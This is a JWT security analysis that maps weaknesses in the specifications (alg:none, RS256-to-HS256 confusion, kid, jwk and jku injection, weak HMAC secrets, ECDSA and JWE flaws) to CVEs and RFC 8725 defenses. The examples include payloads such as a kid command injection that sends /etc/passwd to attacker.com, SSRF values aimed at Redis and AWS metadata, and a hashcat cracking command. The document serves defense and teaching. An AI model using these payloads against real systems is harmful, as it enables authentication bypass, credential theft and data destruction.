# JWT Specification Security Analysis

## Part 1: Algorithmic Architecture Vulnerabilities

### 1.1 `alg` Header: Attacker-Controlled Verification Method

#### Specification Behavior

RFC 7515 §4.1.1:
> "The 'alg' (algorithm) Header Parameter identifies the cryptographic algorithm used to secure the JWS. [...] This Header Parameter MUST be present."

RFC 8725 §2.1 (Acknowledges Design Flaw):
> "Signed JSON Web Tokens carry an explicit indication of the signing algorithm, in the form of the 'alg' Header Parameter, to facilitate cryptographic agility. This, in conjunction with design flaws in some libraries and applications, has led to several attacks."

#### Security Implication

The fundamental design flaw: **the object being verified (token) dictates the method of verification (algorithm)**.

In typical cryptographic systems, the verifier determines the verification algorithm as a policy decision. JWT delegates this to the sender (potential attacker).

#### Attack Vector 1: `alg: none` Bypass

RFC 7519 §6 officially defines Unsecured JWT:
> "An Unsecured JWT is a JWS using the 'alg' Header Parameter value 'none' and with the empty string for its JWS Signature value."

**Attack Scenario**:
```json
// Original JWT (signed)
Header:  {"alg":"RS256","typ":"JWT"}
Payload: {"sub":"user","role":"user"}
Signature: <valid_signature>

// Attacker-modified JWT
Header:  {"alg":"none","typ":"JWT"}
Payload: {"sub":"admin","role":"admin"}
Signature: (empty string)
```

**Real-world CVEs**:
- CVE-2015-9235: Auth0 node-jsonwebtoken
- CVE-2020-28042: WordPress plugin
- CVE-2024-48916: Ceph RadosGW accepts `alg: none` JWT

#### Attack Vector 2: Algorithm Confusion (RS256 → HS256)

RFC 8725 §2.1 explicitly mentions this attack:
> "Some libraries have vulnerabilities when an attacker can choose a weak algorithm for the signature verification."

**Attack Principle**:
1. Server signs JWT with RS256 (asymmetric)
2. Attacker changes header `alg` to HS256 (symmetric)
3. Attacker signs using server's RSA **public key** as HMAC secret
4. If server trusts `alg` header → verifies with public key as HMAC secret → success

**Attack Steps**:
```
1. Obtain server's public key: /.well-known/jwks.json
2. Modify header: {"alg":"HS256","typ":"JWT"}
3. Modify payload: {"sub":"admin","role":"admin"}
4. HMAC-SHA256(message, public_key) = signature
5. Send crafted JWT
```

**Real-world CVEs**:
- CVE-2016-10555: Auth0 node-jsonwebtoken
- CVE-2024-54150: xmidt-org/cjwt library

#### Specification-Based Defense (RFC 8725 §3.1)

> "Libraries MUST enable the caller to specify a supported set of algorithms and MUST NOT use any other algorithms when performing cryptographic operations."

```javascript
// ✅ Correct: Algorithm whitelist
jwt.verify(token, key, { algorithms: ['ES256'] });

// ❌ Vulnerable: Trusts alg header
jwt.verify(token, key);  // Uses alg value from header
```

---

### 1.2 Algorithm-Specific Security Properties

#### HMAC (HS256, HS384, HS512) - RFC 7518 §3.2

**Specification Requirement**:
> "A key of the same size as the hash output (for instance, 256 bits for 'HS256') or larger MUST be used with this algorithm."

**Structural Vulnerabilities**:
1. **Symmetric key structure**: Signer and verifier share the same secret
2. **Offline brute force**: Attacker with JWT can perform unlimited attempts

**Attack: Weak Secret Cracking** (RFC 8725 §2.2, §3.5)

RFC 8725 §2.2:
> "Some applications use a keyed Message Authentication Code (MAC) algorithm, such as 'HS256', to sign tokens but supply a weak symmetric key with insufficient entropy (such as a human-memorable password). Such keys are vulnerable to offline brute-force or dictionary attacks."

**Cracking Tools**:
```bash
# Hashcat (mode 16500: JWT)
hashcat -a 0 -m 16500 jwt.txt rockyou.txt

# Common weak secrets
secret, password, jwt_secret_key, 123456, default
```

**Specification-Based Defense** (RFC 8725 §3.5):
> "Human-memorizable passwords MUST NOT be directly used as the key to a keyed-MAC algorithm such as 'HS256'."

#### ECDSA (ES256, ES384, ES512) - RFC 7518 §3.4

**Specification Gap**:
RFC 7518 §3.4 defines elliptic curve algorithms (P-256, P-384, P-521) but does not explicitly mandate nonce (k-value) safety in signature generation.

**Structural Vulnerability**: Nonce reuse leads to private key recovery

RFC 8725 §3.2:
> "Elliptic Curve Digital Signature Algorithm (ECDSA) signatures require a unique random value for every message that is signed. If even just a few bits of the random value are predictable across multiple messages, then the security of the signature scheme may be compromised. In the worst case, the private key may be recoverable by an attacker."

**Real-world Case**: Sony PlayStation 3 ECDSA private key compromise (nonce reuse)

**Specification-Based Defense** (RFC 8725 §3.2):
> "JWT libraries SHOULD implement ECDSA using the deterministic approach defined in RFC 6979."

RFC 6979 generates nonce deterministically from message and private key, eliminating dependency on random number generator quality.

#### Additional Attack: Psychic Signature (CVE-2022-21449)

**Vulnerability**: Java's ECDSA implementation did not reject `r=0, s=0` signatures

```
Header:  {"alg":"ES256","typ":"JWT"}
Payload: {"sub":"admin","role":"admin"}
Signature: MAYCAQACAQA=  (Base64URL encoding of r=0, s=0)
```

Any JWT with empty signature (`r=0, s=0`) bypassed all ECDSA verification.

**Affected Versions**: Java 15.0.0–18.0.0, 11.0.0–11.0.14, 8u0–8u321, 7u0–7u331

**Specification-Based Defense** (RFC 8725 §3.4):
> "The JWS/JWE library itself must validate these inputs before using them, or it must use underlying cryptographic libraries that do so (or both!)."

---

## Part 2: Header Parameter Injection Vulnerabilities

### 2.1 `kid` (Key ID): Injection Attack Vector

#### Specification Behavior

RFC 7515 §4.1.4:
> "The 'kid' (key ID) Header Parameter is a hint indicating which key was used to secure the JWS. [...] Its value MUST be a case-sensitive string."

**Problem**: No restrictions on `kid` format, length, or usage method.

RFC 8725 §3.10 (Warning):
> "The 'kid' (key ID) header is used by the relying application to perform key lookup. Applications should ensure that this does not create SQL or LDAP injection vulnerabilities by validating and/or sanitizing the received value."

#### Attack Vector 1: SQL Injection

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key1' UNION SELECT 'known_secret' AS key_value -- "
}
```

**Vulnerable Server Code**:
```sql
SELECT key_value FROM jwt_keys WHERE key_id = '${kid}'
-- Result: Returns attacker's known 'known_secret'
```

#### Attack Vector 2: Path Traversal

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../dev/null"
}
```

`/dev/null` returns empty value, so signing with empty string as secret can bypass verification.

#### Attack Vector 3: Command Injection

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key.pem; curl https://attacker.com/exfil?data=$(cat /etc/passwd)"
}
```

**Vulnerable Server Code**:
```javascript
const key = execSync(`cat /keys/${kid}`);  // RCE
```

#### Specification-Based Defense (RFC 8725 §3.10)

> "Applications should [...] validating and/or sanitizing the received value."

```javascript
// ✅ Input validation
function validateKID(kid) {
  if (!/^[a-zA-Z0-9_-]{1,64}$/.test(kid)) {
    throw new Error('Invalid kid format');
  }
  return kid;
}

// ✅ Whitelist-based key lookup
const ALLOWED_KEYS = {
  'key-2024-01': 'actual_secret_value',
  'key-2024-02': 'another_secret_value'
};

function getKey(kid) {
  if (!ALLOWED_KEYS[kid]) {
    throw new Error('Unknown key ID');
  }
  return ALLOWED_KEYS[kid];
}
```

---

### 2.2 `jwk` (JSON Web Key): Attacker's Public Key Injection

#### Specification Behavior

RFC 7515 §4.1.3:
> "The 'jwk' (JSON Web Key) Header Parameter is the public key that corresponds to the key used to digitally sign the JWS."

Allows inclusion of verification public key within the token itself.

#### Security Implication

If server uses `jwk` header key **without cross-verification against trusted key source**, attacker can generate their own key pair and attack.

#### Attack Scenario

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "n": "<attacker's RSA public key>"
  }
}
```

1. Attacker generates RSA key pair
2. Inserts public key into `jwk` header
3. Signs JWT with their private key
4. Server verifies with `jwk` key → naturally succeeds

**Real-world CVEs**:
- CVE-2018-0114: PyJWT library
- BlackHat USA 2023: authlib library

#### Specification-Based Defense (RFC 8725 §3.10)

> "Applications SHOULD use other mechanisms to determine the authenticity of the key, such as [...] matching the 'kid' to a key in a known JWK Set."

```javascript
// ❌ Vulnerable
const header = decodeHeader(token);
const publicKey = header.jwk;  // Trusts key from token
jwt.verify(token, publicKey);

// ✅ Correct
const trustedKeys = loadTrustedKeysFromSecureSource();
const keyId = header.kid;
const publicKey = trustedKeys[keyId];  // Lookup from trusted source
jwt.verify(token, publicKey);
```

---

### 2.3 `jku` / `x5u`: External Key URL Manipulation and SSRF

#### Specification Behavior

RFC 7515 §4.1.2:
> "The 'jku' (JWK Set URL) Header Parameter is a URI that refers to a resource for a set of JSON-encoded public keys, one of which corresponds to the key used to digitally sign the JWS."

RFC 8725 §3.10 (SSRF Warning):
> "Blindly following a 'jku' (JWK Set URL) or 'x5u' (X.509 URL) header, which may contain an arbitrary URL, could result in server-side request forgery (SSRF) attacks."

#### Attack Scenario

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "attacker-key",
  "jku": "https://attacker.com/.well-known/jwks.json"
}
```

Attacker's JWKS:
```json
{
  "keys": [{
    "kty": "RSA",
    "kid": "attacker-key",
    "e": "AQAB",
    "n": "<attacker's RSA public key>"
  }]
}
```

#### Additional Attack: SSRF

```json
{
  "jku": "http://localhost:6379/FLUSHALL"  // Redis wipe
}
```

```json
{
  "jku": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"  // AWS metadata exfiltration
}
```

#### Specification-Based Defense (RFC 8725 §3.10)

> "Applications SHOULD protect against such attacks, e.g., by matching the URL to a whitelist of allowed locations and ensuring no cookies are sent in the GET request."

```javascript
const ALLOWED_JKU_DOMAINS = [
  'https://auth.example.com',
  'https://keys.example.com'
];

function validateJKU(jku) {
  const url = new URL(jku);

  if (url.protocol !== 'https:') {
    throw new Error('Only HTTPS allowed');
  }

  if (!ALLOWED_JKU_DOMAINS.includes(url.origin)) {
    throw new Error('JKU domain not in whitelist');
  }

  return jku;
}
```

---

## Part 3: Claims Validation and Token Confusion Attacks

### 3.1 Stateless Design and Token Revocation Impossibility

#### Specification Behavior

RFC 7519 §4.1.4 (`exp` claim):
> "The 'exp' (expiration time) claim identifies the expiration time on or after which the JWT MUST NOT be accepted for processing."

**Problem**: No mechanism for pre-expiration token revocation in the specification.

RFC 7519 §4.1.7 (`jti` claim):
> "The 'jti' (JWT ID) claim provides a unique identifier for the JWT. [...] The 'jti' claim can be used to prevent the JWT from being replayed."

**Problem**: `jti` enables **detection** of reuse but provides no revocation mechanism.

#### Security Implication

JWT's stateless design is core to scalability benefits, but creates severe security issues in these scenarios:

1. **Token compromise**: Attacker free to use until expiration
2. **Logout**: Client deletes token, server still recognizes validity
3. **Password change**: Existing tokens remain valid
4. **Account suspension**: Access possible until token expiration

#### Attack Scenario

```
1. User logs in → JWT issued (exp: 24 hours later)
2. Attacker steals JWT (XSS, network sniffing, etc.)
3. User logs out
4. Attacker uses stolen JWT for API calls → success (token still valid)
```

#### Specification Limitation

RFC 7519 provides no direct revocation mechanism. Short `exp` and `jti` replay detection are the maximum tools the spec offers.

#### Practical Defense (Outside Specification)

1. **Short expiration** (5-15 minutes) + Refresh Token
2. **Token Blacklist** (Redis, etc.):
   ```javascript
   // On logout
   await redis.setex(`revoked:${jti}`, ttl, '1');

   // On verification
   if (await redis.get(`revoked:${jti}`)) {
     throw new Error('Token revoked');
   }
   ```
3. **Token Versioning**:
   ```json
   {
     "sub": "user123",
     "v": 5  // Version number
   }
   ```
   Increment version on password change → reject previous versions

---

### 3.2 `aud` (Audience) Non-Validation: Token Substitution Attack

#### Specification Behavior

RFC 7519 §4.1.3:
> "Each principal intended to process the JWT MUST identify itself with a value in the audience claim. If the principal processing the claim does not identify itself with a value in the 'aud' claim when this claim is present, then the JWT MUST be rejected."

**Problem**: `aud` claim usage itself is OPTIONAL.

RFC 8725 §2.7 (Substitution Attacks):
> "If an OAuth 2.0 access token is legitimately presented to an OAuth 2.0 protected resource for which it is intended, that protected resource might then present that same access token to a different protected resource for which the access token is not intended."

#### Security Implication

Without `aud` validation, a token issued for one service (A) can be reused at another service (B).

#### Attack Scenario

```
System Architecture:
- auth-service: JWT issuer
- api-service: General API
- admin-service: Admin API

Attack:
1. Attacker legitimately obtains api-service token:
   {"iss":"auth","sub":"user","aud":"api-service","role":"user"}

2. Submits this token to admin-service
   If admin-service doesn't validate aud → authentication succeeds
```

#### Real-world CVE

**CVE-2024-5798**: HashiCorp Vault did not strictly validate JWT `aud` claim, allowing authentication bypass

#### Specification-Based Defense (RFC 8725 §3.9)

> "If the same issuer can issue JWTs that are intended for use by more than one relying party or application, the JWT MUST contain an 'aud' (audience) claim that can be used to determine whether the JWT is being used by an intended party or was substituted by an attacker at an unintended party."

```javascript
// ✅ Correct
const payload = jwt.verify(token, publicKey, {
  algorithms: ['ES256'],
  issuer: 'https://auth.example.com',
  audience: 'https://api.example.com'  // Specify own identifier
});

// ❌ Vulnerable
const payload = jwt.verify(token, publicKey);  // No aud validation
```

---

### 3.3 Cross-JWT Confusion: Token Type Confusion

#### Specification Behavior

RFC 8725 §2.8:
> "As JWTs are being used by more different protocols in diverse application areas, it becomes increasingly important to prevent cases of JWT tokens that have been issued for one purpose being subverted and used for another."

RFC 8725 §3.11:
> "Explicit JWT typing is accomplished by using the 'typ' Header Parameter."

**Problem**: `typ` header is OPTIONAL and token type distinction is not enforced.

#### Security Implication

When same issuer issues multiple JWT types (ID Token, Access Token, Refresh Token, Internal Token, etc.), one token type can be misinterpreted as another.

#### Attack Scenario

```
Scenario: OAuth 2.0 Implementation

1. ID Token (for user info lookup):
   {"typ":"JWT","alg":"RS256"}
   {"sub":"user123","email":"user@example.com","aud":"client-app"}

2. Access Token (for API calls):
   {"typ":"at+jwt","alg":"RS256"}
   {"sub":"user123","scope":"api:write","aud":"api-service"}

Attack:
- Use ID Token as Access Token for API calls
- If server doesn't validate typ → success
```

#### Specification-Based Defense (RFC 8725 §3.11, §3.12)

> "It is RECOMMENDED that the 'typ' Header Parameter be used for explicit typing of JWTs. [...] Application processing rules can then use the 'typ' value to ensure that the JWT is a particular expected type."

```javascript
// ✅ Explicit type validation
function verifyAccessToken(token) {
  const header = decodeHeader(token);

  if (header.typ !== 'at+jwt') {
    throw new Error('Expected Access Token (at+jwt)');
  }

  return jwt.verify(token, publicKey, { algorithms: ['ES256'] });
}

function verifyIDToken(token) {
  const header = decodeHeader(token);

  if (header.typ && header.typ !== 'JWT') {
    throw new Error('Expected ID Token (JWT)');
  }

  return jwt.verify(token, publicKey, { algorithms: ['ES256'] });
}
```

---

### 3.4 `iss` (Issuer) Validation and Issuer-Key Binding

#### Specification Behavior

RFC 7519 §11.1:
> "The contents of a JWT cannot be relied upon in a trust decision unless its contents have been cryptographically secured and bound to the context necessary for the trust decision. In particular, the key(s) used to sign and/or encrypt the JWT will typically need to verifiably be under the control of the party identified as the issuer of the JWT."

**Problem**: Many implementations only perform signature verification without confirming that the signing key actually belongs to the `iss` claim's issuer.

#### Security Implication

In multi-tenant systems or federated environments, a token signed with Issuer A's key can forge `iss` claim to Issuer B.

#### Specification-Based Defense (RFC 8725 §3.8)

> "When a JWT contains an 'iss' (issuer) claim, the application MUST validate that the cryptographic keys used for the cryptographic operations in the JWT belong to the issuer."

```javascript
// ✅ Issuer-key binding validation
const trustedIssuers = {
  'https://auth-a.example.com': publicKeyA,
  'https://auth-b.example.com': publicKeyB
};

function verifyWithIssuerBinding(token) {
  const unverifiedPayload = jwt.decode(token);

  if (!unverifiedPayload.iss) {
    throw new Error('Missing iss claim');
  }

  const publicKey = trustedIssuers[unverifiedPayload.iss];
  if (!publicKey) {
    throw new Error('Unknown or untrusted issuer');
  }

  // Verify only with key corresponding to iss claim
  return jwt.verify(token, publicKey, {
    algorithms: ['ES256'],
    issuer: unverifiedPayload.iss
  });
}
```

---

## Part 4: JWE (Encryption) Vulnerabilities

### 4.1 Invalid Curve Attack (ECDH-ES)

#### Specification Behavior

RFC 7518 §4.6 defines ECDH-ES (Elliptic Curve Diffie-Hellman Ephemeral Static) key agreement algorithm.

RFC 8725 §2.5:
> "Several JOSE libraries fail to validate their inputs correctly when performing elliptic curve key agreement (the 'ECDH-ES' algorithm). An attacker that is able to send JWEs of its choosing that use invalid curve points and observe the cleartext outputs resulting from decryption with the invalid curve points can use this vulnerability to recover the recipient's private key."

#### Security Implication

When attacker provides an invalid curve point (not on the valid elliptic curve) as JWE's ephemeral public key (`epk`), observing recipient's ECDH computation results allows gradual private key recovery.

#### Specification-Based Defense (RFC 8725 §3.4)

> "For the NIST prime-order curves P-256, P-384, and P-521, validation MUST be performed according to Section 5.6.2.3.4 (ECC Partial Public-Key Validation Routine) of NIST SP 800-56A Revision 3."

```
ECC Partial Public-Key Validation:
1. Q ≠ O (not point at infinity)
2. xQ and yQ are valid field elements
3. Q satisfies elliptic curve equation: y² = x³ + ax + b (mod p)
4. nQ = O (n is curve order)
```

---

### 4.2 Compression-Based Plaintext Leakage (CRIME/BREACH-like Attack)

#### Specification Behavior

RFC 7516 §4.1.3 defines `zip` (Compression Algorithm) header parameter:
> "The 'zip' (compression algorithm) applied to the plaintext before encryption, if any."

RFC 8725 §3.6:
> "Compression of data SHOULD NOT be done before encryption, because such compressed data often reveals information about the plaintext."

#### Security Implication

Compression algorithms (e.g., DEFLATE) reduce data size by eliminating repetitive patterns. If attacker can control part of payload and compression is applied before encryption, observing ciphertext length changes can infer secret data.

#### Attack Principle (CRIME/BREACH)

```
Scenario: JWE payload contains cookie value

1. Secret attacker wants to know: "session_id=X"
2. Attacker-controllable input: Request header

Attack:
For each guess in ['A', 'B', 'C', ...]:
  - Insert "session_id=A" into input
  - Compress → Encrypt
  - Observe ciphertext length
  - Shortest length = Maximum compression = Matches actual value
```

#### Specification-Based Defense (RFC 8725 §3.6)

> "If compression is performed, it MUST be performed before encryption and the 'zip' parameter MUST only be used inside the JWE Protected Header."

In practice, completely disabling compression in JWE is recommended.

---

## Part 5: Recent CVEs and Attack Cases (2024-2025)

| CVE | Target | Vulnerability Type | Exploited Spec Behavior | Severity |
|-----|--------|-------------------|------------------------|----------|
| CVE-2024-54150 | cjwt (C library) | Algorithm Confusion (RS→HS) | `alg` header trust (RFC 7515 §4.1.1) | Critical |
| CVE-2024-48916 | Ceph RadosGW | `alg: none` acceptance | Unsecured JWT (RFC 7519 §6) | Critical |
| CVE-2024-53861 | PyJWT | `iss` claim validation DoS | `iss` processing (RFC 7519 §4.1.1) | High |
| CVE-2024-5798 | HashiCorp Vault | `aud` validation bypass | `aud` OPTIONAL (RFC 7519 §4.1.3) | High |
| CVE-2025-4692 | Cloud Platform | JWT validation bypass | Implementation-level validation failure | Critical |
| CVE-2022-21449 | Java JDK | Psychic Signature (ECDSA) | `r=0, s=0` non-rejection | Critical |

---

## Appendix A: Attack-Specification-Defense Mapping

| # | Attack Type | Exploited Spec Behavior | RFC Reference | Specification-Based Defense |
|---|------------|------------------------|---------------|----------------------------|
| 1 | `alg: none` bypass | Unsecured JWT allowance | RFC 7519 §6 | Algorithm whitelist (RFC 8725 §3.1) |
| 2 | Algorithm Confusion | `alg` header trust | RFC 7515 §4.1.1 | Key-algorithm binding (RFC 8725 §3.1) |
| 3 | `jwk` injection | In-token key insertion | RFC 7515 §4.1.3 | Trusted key source only |
| 4 | `jku` URL manipulation | External key URL reference | RFC 7515 §4.1.2 | URL whitelist (RFC 8725 §3.10) |
| 5 | `kid` injection | No format restriction | RFC 7515 §4.1.4 | Input validation/sanitization (RFC 8725 §3.10) |
| 6 | Weak HMAC key cracking | Unspecified key entropy | RFC 7518 §3.2 | Minimum 256-bit entropy (RFC 8725 §3.5) |
| 7 | ECDSA nonce reuse | Random nonce dependency | RFC 7518 §3.4 | Deterministic ECDSA (RFC 6979) |
| 8 | Psychic Signature | ECDSA input non-validation | RFC 7518 §3.4 | Cryptographic input validation (RFC 8725 §3.4) |
| 9 | Invalid Curve attack | ECDH-ES input non-validation | RFC 7518 §4.6 | Curve point validation (NIST SP 800-56A) |
| 10 | Token Substitution | `aud` OPTIONAL | RFC 7519 §4.1.3 | Mandatory `aud` validation (RFC 8725 §3.9) |
| 11 | Cross-JWT Confusion | Token type distinction absence | RFC 7519 §5.1 | Explicit `typ` typing (RFC 8725 §3.11) |
| 12 | Issuer spoofing | `iss`-key binding non-validation | RFC 7519 §11.1 | Issuer-key binding (RFC 8725 §3.8) |
| 13 | Expired token reuse | Stateless design | RFC 7519 §4.1.4 | Short `exp` + Refresh Token |
| 14 | Compression plaintext leak | JWE compression allowance | RFC 7516 §4.1.3 | Compression disable (RFC 8725 §3.6) |

---

## Appendix B: JWT Security Validation Checklist

### Signature/Cryptographic Validation
- [ ] Algorithm whitelist enforcement (`alg` value server-side mandated)
- [ ] `alg: none` explicit rejection
- [ ] Key-algorithm binding validation (each key maps to exactly one algorithm)
- [ ] Asymmetric keys cannot be used with symmetric algorithms (type check)
- [ ] ECDSA signatures use RFC 6979 (deterministic nonce)
- [ ] ECDH-ES elliptic curve point validity validation
- [ ] Nested JWT inner/outer all cryptographic operations validated

### Header Parameter Security
- [ ] `jwk` header ignored or cross-verified against trusted key source
- [ ] `jku` / `x5u` URL whitelist enforcement
- [ ] `kid` value input validation (SQLi, Path Traversal, Command Injection prevention)
- [ ] `x5c` certificate chain validated to trusted CA
- [ ] `cty` header processing restricted

### Claims Validation
- [ ] `iss` (issuer) validation with issuer-key binding verification
- [ ] `aud` (audience) validation (match own identifier)
- [ ] `exp` (expiration) validation — minimize clock skew tolerance (≤60s)
- [ ] `nbf` (not before) validation
- [ ] `sub` (subject) validation
- [ ] `typ` header validation (expected token type confirmation)
- [ ] Duplicate claims rejection

### Key Management
- [ ] HMAC keys: Minimum 256-bit entropy (human-memorable passwords forbidden)
- [ ] RSA keys: Minimum 2048 bits
- [ ] Key rotation mechanism implementation
- [ ] Private/secret keys in secure storage (HSM, KMS)

### Operational Security
- [ ] JWT expiration minimized (5-15 minutes)
- [ ] Refresh Token stateful (server-side storage/revocation capable)
- [ ] JWE compression disabled
- [ ] HTTPS-only transmission
- [ ] JWT not transmitted via URL parameters
- [ ] Sensitive information not in JWT payload

---

## References

- RFC 7515: JSON Web Signature (JWS)
- RFC 7516: JSON Web Encryption (JWE)
- RFC 7517: JSON Web Key (JWK)
- RFC 7518: JSON Web Algorithms (JWA)
- RFC 7519: JSON Web Token (JWT)
- RFC 8725: JSON Web Token Best Current Practices (2020)
- RFC 6979: Deterministic Usage of the Digital Signature Algorithm (DSA) and Elliptic Curve Digital Signature Algorithm (ECDSA)
- NIST SP 800-56A Rev. 3: Recommendation for Pair-Wise Key-Establishment Schemes Using Discrete Logarithm Cryptography
